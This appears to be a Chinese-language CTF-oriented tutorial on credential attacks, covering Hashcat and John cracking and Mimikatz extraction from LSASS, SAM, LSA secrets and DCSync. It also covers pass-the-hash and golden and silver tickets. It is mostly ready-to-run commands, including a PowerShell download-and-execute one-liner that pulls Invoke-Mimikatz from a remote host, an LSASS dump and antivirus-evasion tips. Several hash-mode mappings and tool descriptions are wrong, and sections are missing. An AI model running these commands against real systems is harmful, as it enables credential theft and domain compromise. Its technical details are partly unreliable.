# 密码攻击与凭证收集

## 1. 概述

凭证是内网渗透的通行证。在CTF竞赛中，获得有效凭证（密码、哈希、票据、密钥）意味着可以横向移动到更多主机、读取敏感数据。本节系统覆盖Hashcat/John离线密码破解、Windows凭证提取（Mimikatz/LSAMDump）、Linux凭证收集、DPAPI解密、浏览器/应用密码提取等技术。在攻击链中，凭证收集往往决定了能从单机突破走多远。

## 2. 核心原理

### 2.1 密码哈希类型识别

```
常见哈希格式与识别：

Linux:
├── $1$salt$hash              → MD5 Crypt (hashcat -m 500)
├── $5$rounds=5000$salt$hash  → SHA-256 Crypt (hashcat -m 7400)
├── $6$rounds=5000$salt$hash  → SHA-512 Crypt (hashcat -m 1800)
├── $y$salt$hash              → yescrypt (hashcat -m 31000)
├── $2a$...$hash              → bcrypt (hashcat -m 3200)
└── $argon2id$...             → Argon2 (hashcat -m 9300)

Windows:
├── 32 chars hex               → MD4 (NTLM) (hashcat -m 1000)
├── LM:NT split                → LM + NTLM (hashcat -m 3000)
└── aes256-cts-hmac-sha1-96    → Kerberos AES

Web应用:
├── $P$B...                    → phpBB3/WordPress (hashcat -m 400)
├── $2y$...                    → bcrypt (hashcat -m 3200)
├── sha256:...                 → SHA256 (hashcat -m 1400)
└── md5($pass.$salt)           → salted MD5 (hashcat -m 10)

数据库:
├── mysql323:                  → MySQL 3.x (hashcat -m 200)
├── mysql-sha1:                → MySQL 4.1+ (hashcat -m 300)
└── 3DES-CBC                   → MSSQL 2012+ (hashcat -m 1731)
```

### 2.2 Windows认证体系

```
Windows本地认证 (本地SAM):
用户密码 → NTLM Hash → 存储在 SAM\Domains\Account\Users\<RID>

Windows网络认证:
挑战-应答机制 (NTLMv2) → Net-NTLMv2 Hash
捕捉到的Net-NTLMv2 Hash可用于中继或离线破解

Windows域认证:
Kerberos → 使用用户NTLM Hash作为长期密钥
AS-REQ → TGT (krbtgt hash加密) → ST (服务账户hash加密)
```

## 3. Hashcat密码破解

### 3.1 Hashcat基础

```bash
# === 安装与信息 ===
# Linux
sudo apt install hashcat
# 或下载最新版
wget https://hashcat.net/files/hashcat-x.x.x.7z

# 查看GPU信息
hashcat -I

# 基准测试
hashcat -b

# 列出所有哈希模式
hashcat --help | head -50
hashcat --example-hashes | grep -A5 "Mode.*1400"

# === 基础语法 ===
hashcat -m <mode> -a <attack_mode> <hash_file> <wordlist>

# 攻击模式：
# -a 0 = 字典攻击 (Straight)
# -a 1 = 组合攻击 (Combination) 
# -a 3 = 掩码攻击 (Brute-force / Mask)
# -a 6 = 字典 + 掩码 (Hybrid Wordlist + Mask)
# -a 7 = 掩码 + 字典 (Hybrid Mask + Wordlist)
```

### 3.2 常见哈希模式速查

```bash
# === Linux密码哈希 ===
-m 500   # MD5 Crypt ($1$)
-m 3200  # bcrypt Blowfish ($2a$, $2b$, $2y$)
-m 7400  # SHA-256 Crypt ($5$)
-m 1800  # SHA-512 Crypt ($6$)
-m 31000 # yescrypt ($y$)

# 例: 破解 /etc/shadow 中的 SHA-512 哈希
hashcat -m 1800 -a 0 shadow.hash /usr/share/wordlists/rockyou.txt --force

# === Windows NTLM (NT) ===
-m 1000  # NTLM (单条)
-m 3000  # LM (旧格式，禁用后为空值占位符)
-m 1000  # NTLM - 最常用于破解本地/域用户密码哈希

# 例: 破解NT哈希
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt --force

# === Windows Net-NTLMv2 (网络捕获的挑战-应答) ===
-m 5600  # Net-NTLMv2

# 例: 破解Responder捕获的Net-NTLMv2
hashcat -m 5600 -a 0 responder_hashes.txt /usr/share/wordlists/rockyou.txt

# === Kerberos ===
-m 13100 # Kerberos 5 TGS-REP (RC4-HMAC) - Kerberoasting
-m 18200 # Kerberos 5 AS-REP (RC4-HMAC) - AS-REP Roasting
-m 19600 # Kerberos 5 TGS-REP (AES128-CTS-HMAC-SHA1-96)
-m 19700 # Kerberos 5 TGS-REP (AES256-CTS-HMAC-SHA1-96)

# === Web应用 ===
-m 0     # MD5 (原始MD5，无盐)
-m 400   # WordPress (phpass) $P$B...
-m 3200  # Modern bcrypt
-m 1400  # SHA-256
-m 1700  # SHA-512

# === 数据库 ===
-m 200   # MySQL 3.x
-m 300   # MySQL 4.1+ / 5.x
-m 131   # MSSQL (2000)
-m 132   # MSSQL (2005)
-m 1731  # MSSQL (2012, 2014)

# === 加密文档/压缩包 ===
-m 11600 # 7-Zip
-m 13000 # RAR5
-m 13600 # WinZip
-m 13721 # VeraCrypt

# === 应用密码 ===
-m 125   # ARPANSA ephemeral
-m 6800  # LastPass

# === WPA/WPA2/WPA3 ===
-m 22000 # WPA-PBKDF2-PMKID+EAPOL (合并模式)

# 使用hashid辅助识别
hashid hash.txt
hashid -m hash.txt  # 直接给出hashcat模式号
```

### 3.3 高级攻击模式

```bash
# === 1. 掩码攻击 (Mask Attack / -a 3) ===
# 当你知道密码的部分结构时非常有效
# 内置字符集：
# ?l = 小写字母 (a-z)
# ?u = 大写字母 (A-Z)
# ?d = 数字 (0-9)
# ?s = 特殊字符 (!@#$%等)
# ?a = 所有可打印字符
# ?h = 十六进制 (0-9a-f)
# ?H = 十六进制大写 (0-9A-F)

# 例: 密码=8位全小写字母+数字
hashcat -m 1000 -a 3 hash.txt ?l?l?l?l?l?l?l?l

# 例: 密码=公司名开头+生日
hashcat -m 1000 -a 3 hash.txt Company?d?d?d?d

# 例: 密码=大写+5小写+2数字（已知模式）
hashcat -m 1000 -a 3 hash.txt ?u?l?l?l?l?l?d?d

# 自定义字符集
# -1 自定义字符集1, -2 自定义字符集2
hashcat -m 1000 -a 3 -1 ?l?d -2 ?u?d hash.txt ?1?1?1?1?2?2

# === 2. 字典+规则 (Rule-Based Attack) ===
# 使用rules文件变形字典
hashcat -m 1000 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/dive.rule
hashcat -m 1000 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule

# 查看规则文件（了解有哪些变形）
cat /usr/share/hashcat/rules/best64.rule

# 自定义规则（例如添加!@#后缀）
echo '$! $@ $#' > /tmp/myrule.rule
hashcat -m 1000 -a 0 hash.txt rockyou.txt -r /tmp/myrule.rule

# === 3. 混合攻击 (Hybrid -a 6 / -a 7) ===
# -a 6: 字典 + 掩码后缀
hashcat -m 1000 -a 6 hash.txt rockyou.txt ?d?d?d?d  # 密码后加4位数字

# -a 7: 掩码前缀 + 字典
hashcat -m 1000 -a 7 hash.txt ?d?d?d?d rockyou.txt  # 4位数字后加单词

# === 4. 组合攻击 (Combination / -a 1) ===
# 两个字典的排列组合
hashcat -m 1000 -a 1 hash.txt words1.txt words2.txt

# === 5. 管道攻击 (stdin) ===
# 使用其他工具生成候选密码输入
crunch 8 8 -t @@@@%%%% | hashcat -m 1000 hashes.txt -r /dev/stdin

# 从数据库提取的密码做字典
mysql -u root -e "SELECT password FROM users" | hashcat -m 1000 hashes.txt

# === 输出选项 ===
# 显示已破解
hashcat -m 1000 hash.txt --show
# 输出为文件
hashcat -m 1000 hash.txt --show -o cracked.txt
# 只显示密码本身
hashcat -m 1000 hash.txt --show | cut -d: -f2
```

## 4. John the Ripper

### 4.1 John基础

```bash
# === 安装 ===
sudo apt install john

# === 基础用法 ===
# 自动检测哈希类型
john hash.txt

# 指定格式
john --format=raw-md5 hash.txt
john --format=NT hash.txt
john --format=sha512crypt hash.txt

# === 破解Linux /etc/shadow ===
# 1. unshadow: 合并passwd和shadow文件
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john unshadowed.txt

# === 破解Windows SAM哈希 ===
john --format=NT sam_hashes.txt

# === 破解ZIP/RAR/7z ===
# ZIP
zip2john encrypted.zip > zip_hash.txt
john zip_hash.txt

# RAR
rar2john encrypted.rar > rar_hash.txt
john rar_hash.txt

# 7z
7z2john encrypted.7z > 7z_hash.txt
john 7z_hash.txt

# === 破解SSH私钥 ===
ssh2john id_rsa > ssh_hash.txt
john --wordlist=rockyou.txt ssh_hash.txt

# === 破解PDF ===
pdf2john encrypted.pdf > pdf_hash.txt
john pdf_hash.txt

# === 破解WPA/WPA2握手 ===
# 使用airodump-ng或hcxdumptool获取握手包
hccap2john handshake.hccapx > wpa_hash.txt
john wpa_hash.txt

# === 破解Office文档 ===
office2john document.docx > office_hash.txt
john office_hash.txt

# === 破解Kerberos票据 ===
john --format=krb5tgs kerberoast_hash.txt  # TGS票据
john --format=krb5asrep asrep_hash.txt     # AS-REP票据

# === 破解维护 ===
# 显示已破解的密码
john --show hash.txt
# 恢复
john --restore
# 查看会话
john --status
```

### 4.2 John规则与字典

```bash
# === John规则库 ===
# 查看规则文件
ls /etc/john/
cat /etc/john/john.conf

# 使用规则（规则名默认在配置文件中有定义）
john --wordlist=rockyou.txt --rules=Single hash.txt
john --wordlist=rockyou.txt --rules=Wordlist hash.txt
john --wordlist=rockyou.txt --rules=Jumbo hash.txt

# === 常用技巧 ===
# 使用--loopback对已破解密码再做一次攻击
john --loopback hash.txt

# 生成随机pot文件
john --pot=custom.pot hash.txt

# === John与Hashcat对比 ===
# John的hash识别更准确
# Hashcat的GPU利用率更好
# 推荐工作流: John识别hash → Hashcat破解
```

## 5. Windows凭证收集

### 5.1 Mimikatz

Mimikatz是Windows凭证提取的瑞士军刀，也是CTF中最常用的工具之一。

```bash
# === Mimikatz基础操作 ===
# 提升到SYSTEM权限后
mimikatz.exe "privilege::debug" "token::elevate"

# === 从LSASS提取凭证 ===
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
# 输出包括:
# - 当前登录用户的明文密码（仅Windows 7/Server 2008, WDigest启用时）
# - NTLM哈希
# - SHA1哈希
# - Kerberos票据信息

# 提取Kerberos票据
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit
# 导出所有Kerberos票据为.kirbi文件

# === SAM本地数据库提取 ===
# 需要SYSTEM权限
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit
# 提取本地SAM中的所有用户哈希

# 从SAM/SYSTEM注册表文件提取（离线）
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
mimikatz.exe "lsadump::sam /sam:sam.save /system:system.save" exit

# === LSA Secrets (缓存的凭证) ===
mimikatz.exe "privilege::debug" "lsadump::secrets" exit
# 提取:
# - 服务账户密码
# - 缓存的域凭据
# - AutoLogon密码
# - DPAPI主密钥

# === LSASS Dump (转储内存分析) ===
mimikatz.exe "privilege::debug" "lsadump::lsa /patch" exit

# === DCSync (域控同步攻击) ===
# 需要域复制权限
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:DOMAIN.LOCAL /user:krbtgt" exit
mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:DOMAIN.LOCAL /all /csv" exit

# === Kerberos票据操作 ===
# Pass-the-Hash
mimikatz.exe "sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:<HASH> /run:cmd.exe"

# Pass-the-Ticket
mimikatz.exe "kerberos::ptt ticket.kirbi"

# Golden Ticket
mimikatz.exe "kerberos::golden /domain:DOMAIN /sid:<SID> /krbtgt:<KRBTGT_HASH> /user:Administrator /id:500 /ptt" exit

# Silver Ticket
mimikatz.exe "kerberos::golden /domain:DOMAIN /sid:<SID> /target:DC01 /service:CIFS /rc4:<COMPUTER_HASH> /user:Administrator /ptt" exit

# === Mimikatz规避技巧 ===
# 1. 重命名
copy mimikatz.exe m.exe

# 2. 远程加载（无落地文件）
# 使用Cobalt Strike或Metasploit的load kiwi

# 3. 使用Mimikatz In-Memory Powershell
# Invoke-Mimikatz.ps1
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.100/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'"

# 4. Procdump +离线Mimikatz
procdump.exe -accepteula -ma lsass.exe lsass.dmp
# 复制lsass.dmp到攻击机
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
```

## 6. Linux凭证收集

```bash
# === /etc/shadow 密码哈希 ===
cat /etc/shadow | grep -v '*:' | grep -v '!:'

unshadow /etc/passwd /etc/shadow > shadow_combined
john --format=sha512crypt shadow_combined
```

## 9. 常见误区与注意事项

- **误区1：认为Mimikatz只能在DC上运行。** Mimikatz在任何Windows主机都可以运行（只要权限足够），关键是能否获得高价值凭证。
- **误区2：只收集哈希不尝试破解。** 即使不能立即获得明文密码，应收集所有哈希进行离线破解。哈希可用于PtH、破解后可能的密码重用。
- **误区3：忽略了应用密码和配置文件。** 浏览器保存的密码、配置文件中的明文密码、bash_history中的命令往往直接暴露高价值凭证。
- **误区4：暴力破解字典太大的时间浪费。** 应分层破解：先试小字典(rockyou/top1000) → 规则+小字典 → 大字典 → 掩码攻击。
- **注意：LSASS内存转储会被杀软检测。优先使用Procdump（微软签名）替代Mimikatz的直接操作。**
- **注意：在域控上使用DCSync比直接Mimikatz更隐蔽（只需要网络访问，不需要在域控上执行代码）。**

## 10. 相关知识点

- **NTLM中继: ** Responder + ntlmrelayx → 捕获并中继Net-NTLMv2
- **Kerberos中继:** 跨协议中继（如通过HTTP到LDAP）
- **AD CS攻击:** ESC1-ESC8, 通过证书服务获取凭证
- **Shadow Credentials: ** 为无凭证目标添加Key Trust
- **密码喷射 (Password Spraying):** 针对性弱密码尝试（避免账户锁定）
- **MFA绕过: ** Illusive Logon, MFA疲劳攻击
- **Linux Keyring: ** GNOME Keyring / KDE Wallet密码提取
- **macOS凭证: ** Keychain访问与解密
